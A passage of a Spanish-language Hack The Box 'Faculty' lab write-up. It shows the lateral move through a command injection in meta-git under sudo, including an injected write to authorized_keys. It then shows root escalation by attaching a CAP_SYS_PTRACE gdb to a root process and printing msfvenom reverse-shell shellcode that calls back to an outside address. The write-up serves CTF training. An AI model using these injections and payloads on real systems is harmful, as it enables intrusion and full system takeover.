</span></span><span style="display:flex;"><span>To: &lt;gbyolo@faculty.htb&gt;
</span></span><span style="display:flex;"><span>X-Mailer: mail <span style="color:#f92672">(</span>GNU Mailutils 3.7<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Message-Id: &lt;20201110140302.0399E26125A@faculty.htb&gt;
</span></span><span style="display:flex;"><span>Date: Tue, <span style="color:#ae81ff">10</span> Nov <span style="color:#ae81ff">2020</span> 15:03:02 +0100 <span style="color:#f92672">(</span>CET<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>From: developer@faculty.htb
</span></span><span style="display:flex;"><span>X-IMAPbase: <span style="color:#ae81ff">1605016995</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Status: O
</span></span><span style="display:flex;"><span>X-UID: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and <span style="color:#66d9ef">if</span> you have troubles just let me know!<span style="color:#ae81ff">\n</span>developer@faculty.htb
</span></span></code></pre></div><p>Con <code>sudo -l</code> podemos ver que tenemos permisos para ejecutar como el usuario <code>developer</code> el binario <code>/usr/local/bin/meta-git</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gbyolo@faculty:/home$ sudo -l
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> gbyolo: 
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> gbyolo on faculty:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User gbyolo may run the following commands on faculty:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> /usr/local/bin/meta-git
</span></span></code></pre></div><p>Y podemos ver que es un enlace simbólico a <code>../lib/node_modules/meta-git/bin/meta-git</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/usr/local/bin/meta-git: symbolic link to ../lib/node_modules/meta-git/bin/meta-git
</span></span></code></pre></div><h2 id="command-injection">Command Injection</h2>
<p>Investigando encontramos que hay una forma de ejecutar comandos utilizando este módulo de node.
<a href="https://hackerone.com/reports/728040">https://hackerone.com/reports/728040</a>
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Podemos ver que efectivamente, podemos inyectar un comando.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone <span style="color:#e6db74">&#39;test||id&#39;</span>
</span></span><span style="display:flex;"><span>meta git cloning into <span style="color:#e6db74">&#39;test||id&#39;</span> at test<span style="color:#f92672">||</span>id
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>test<span style="color:#f92672">||</span>id:
</span></span><span style="display:flex;"><span>fatal: repository <span style="color:#e6db74">&#39;test&#39;</span> does not exist
</span></span><span style="display:flex;"><span>id: ‘test’: no such user
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Ahora, podemos copiar nuestra clave pública al <code>/home/developer/.ssh/authorized_keys</code> para poder acceder por SSH como este usuario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gbyolo@faculty:/tmp$ sudo -u developer /usr/local/bin/meta-git clone <span style="color:#e6db74">&#39;test||echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs/aNkke9LIHvwrIqFLiLavlSa5gVzvG6EibfhsRDbRY0DLzVMaWw2TmVJ/sjcWBg7DqGFJaJ70cqh7rCX9WYQnUTQUoo2yQ4yRG6UxDOEzD6Yt2JbxEZdsZqX7S1NY33zv9vt.......&#34; &gt; /home/developer/.ssh/authorized_keys&#39;</span>
</span></span></code></pre></div><p>Y ya hemos migrado de usuario.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh developer@10.129.227.208
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-121-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Mon Aug <span style="color:#ae81ff">12</span> 11:39:29 CEST <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:           0.01
</span></span><span style="display:flex;"><span>  Usage of /:            75.4% of 4.67GB
</span></span><span style="display:flex;"><span>  Memory usage:          39%
</span></span><span style="display:flex;"><span>  Swap usage:            0%
</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">230</span>
</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.227.208
</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::250:56ff:fe94:8329
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>developer@faculty:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>debug<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>faculty<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y podemos leer la flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>developer@faculty:~$ cat user.txt 
</span></span><span style="display:flex;"><span>d2dcd829adb758f...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Podemos descubrir que tenemos permisos de grupo para ejecutar <code>gdb</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>developer@faculty:~$ find / -type f -group debug 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/gdb
</span></span><span style="display:flex;"><span>developer@faculty:~$ ls -la /usr/bin/gdb
</span></span><span style="display:flex;"><span>-rwxr-x--- <span style="color:#ae81ff">1</span> root debug <span style="color:#ae81ff">8440200</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2021</span> /usr/bin/gdb
</span></span></code></pre></div><p>Pero no tenemos permiso SUID en el binario.</p>
<p>Pero listando capabilities&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>developer@faculty:~$ getcap -r / 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#f92672">=</span> cap_net_bind_service,cap_net_admin+ep
</span></span><span style="display:flex;"><span>/usr/bin/gdb <span style="color:#f92672">=</span> cap_sys_ptrace+ep
</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#f92672">=</span> cap_net_raw+ep
</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#f92672">=</span> cap_net_raw+ep
</span></span></code></pre></div><h2 id="abusing-sys_ptrace">Abusing SYS_PTRACE</h2>
<p>La capacidad <code>CAP_SYS_PTRACE</code> en Linux es una capacidad del kernel que otorga permisos especiales relacionados con la depuración y la inspección de procesos. Aquí te explico qué te permite hacer:</p>
<h3 id="1-depuración-de-procesos">1. <strong>Depuración de Procesos</strong></h3>
<ul>
<li>Permite que un proceso trace o depure otros procesos. Esto incluye el uso de herramientas como <code>gdb</code>, <code>strace</code>, o <code>ptrace</code>, que son fundamentales para depurar programas o monitorear su ejecución.</li>
<li>Normalmente, un proceso sólo puede depurar (trazar) a otro proceso si es hijo suyo o si ambos procesos tienen el mismo ID de usuario efectivo. Con <code>CAP_SYS_PTRACE</code>, este requisito se relaja, permitiendo que un proceso con esta capacidad pueda depurar cualquier otro proceso en el sistema, independientemente del propietario.</li>
</ul>
<h3 id="2-acceso-a-la-memoria-y-estado-de-otros-procesos">2. <strong>Acceso a la Memoria y Estado de Otros Procesos</strong></h3>
<ul>
<li>Con <code>CAP_SYS_PTRACE</code>, un proceso puede acceder y modificar la memoria de otros procesos, lo cual es esencial para herramientas de inyección de código o para manipular el estado de ejecución de otro proceso.</li>
<li>También permite inspeccionar o alterar registros y otros estados internos de un proceso.</li>
</ul>
<h3 id="3-acciones-avanzadas-de-depuración">3. <strong>Acciones Avanzadas de Depuración</strong></h3>
<ul>
<li>La capacidad permite otras acciones avanzadas relacionadas con la depuración, como la manipulación de breakpoints y la captura de señales antes de que lleguen al proceso depurado.</li>
</ul>
<h3 id="4-saltarse-restricciones-de-seguridad">4. <strong>Saltarse Restricciones de Seguridad</strong></h3>
<ul>
<li><code>CAP_SYS_PTRACE</code> también permite que un proceso pase por alto ciertas restricciones de seguridad. Por ejemplo, podría leer datos de procesos que de otro modo no estarían accesibles debido a las políticas de control de acceso.</li>
</ul>
<h3 id="riesgos-de-seguridad"><strong>Riesgos de Seguridad</strong></h3>
<ul>
<li><strong>Elevado potencial de abuso:</strong> Debido a que permite acceso completo a otros procesos, esta capacidad representa un riesgo de seguridad significativo si se concede a un proceso no confiable, ya que podría ser usada para robar datos, modificar el comportamiento de aplicaciones, o incluso para escalar privilegios en el sistema.</li>
<li><strong>Uso limitado a procesos de confianza:</strong> Por estas razones, <code>CAP_SYS_PTRACE</code> generalmente se limita a procesos confiables, como depuradores, o administradores de sistemas que necesitan realizar tareas específicas de diagnóstico.</li>
</ul>
<p>En resumen, que aprovechándonos de esta capability podemos escalar privilegios ya que se nos permite adjuntar <code>gdb</code> a un proceso que esté ejecutando <code>root</code> y acto seguido modificar la memoria para conseguir ejecutar un comando a nivel de sistema.</p>
<p>Hay un <a href="https://book.hacktricks.xyz/v/es/linux-hardening/privilege-escalation/linux-capabilities">artículo en HackTricks</a> que justo contempla este caso.</p>
<p>Creamos nuestro shellcode para mandarnos una reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.13 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f py -o revshell.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">74</span> bytes
</span></span><span style="display:flex;"><span>Final size of py file: <span style="color:#ae81ff">384</span> bytes
</span></span><span style="display:flex;"><span>Saved as: revshell.py
</span></span></code></pre></div><p>Utilizamos el script que se nos adjunta en HackTricks y simplemente modificamos el shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 revshell.py 
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x296a909090909090
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+8<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x5e016a5f026a9958
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x0002b9489748050f
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+24<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x48510d0e0a0abb01
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+32<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x582a6a5a106ae689
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+40<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xceff485e036a050f
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+48<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x6af675050f58216a
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+56<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x69622fbb4899583b
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+64<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x8948530068732f6e
</span></span><span style="display:flex;"><span>set <span style="color:#f92672">{</span>long<span style="color:#f92672">}(</span>$rip+72<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x050fe689485752e7
</span></span></code></pre></div><p>Ahora con <code>ps aux | grep root</code> podemos buscar un proceso que sea de <code>root</code></p>
<p>En mi caso elegiré el PID 1549 que corresponde a postfix.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>developer@faculty:~$ gdb -p <span style="color:#ae81ff">1549</span>
</span></span></code></pre></div><p>Ahora copiamos y pegamos las líneas generadas anteriormente.
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<p>Nos ponemos en escucha con <code>pwncat-cs</code> por el puerto 443.
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>Y si continuamos el flujo del programa..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> c
</span></span></code></pre></div><p>Conseguimos la reverse shell como el usuario <code>root</code>.
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Podemos leer la flag de <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@faculty:/var/spool/postfix# cat /root/root.txt
</span></span><span style="display:flex;"><span>bdd86839ae249a272...
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
